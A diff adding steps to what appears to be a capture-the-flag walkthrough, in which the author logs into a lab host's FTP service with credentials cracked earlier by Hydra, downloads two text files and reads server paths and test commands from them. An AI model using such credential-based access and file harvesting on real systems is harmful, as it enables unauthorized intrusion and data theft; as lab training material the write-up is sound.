@@ -258,7 +258,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-15 23:19:
 
 ```
 
-step 4 We will now use ftp for getting some juicy info and login via founded credentials above, while searching we found 2 txt files which contains web info and some confidential docs as well.
+Step4. We will now use ftp for getting some juicy info and login via founded credentials above, while searching we found 2 txt files which contains web info and some confidential docs as well.
 ```bash
 ┌──(root㉿kali)-[~]
 └─# ftp 10.129.111.81
@@ -296,5 +296,23 @@ local: WebServersInfo.txt remote: WebServersInfo.txt
 ftp> exit
 221-
 221 Goodbye
+```
+
+Step5. We will open the file to read content as below
+```bash
+┌──(root㉿kali)-[~]
+└─# cat docs.txt         
+I'm testing the FTP using HTTPS, everything looks good.                                                                                                                                                                                                                                             
+┌──(root㉿kali)-[~]
+└─# cat WebServersInfo.txt
+CoreFTP:
+Directory C:\CoreFTP
+Ports: 21 & 443
+Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt
+
+Apache
+Directory "C:\xampp\htdocs\"
+Ports: 80 & 4443
+Test Command: curl http://localhost/test.php  
 ```
 
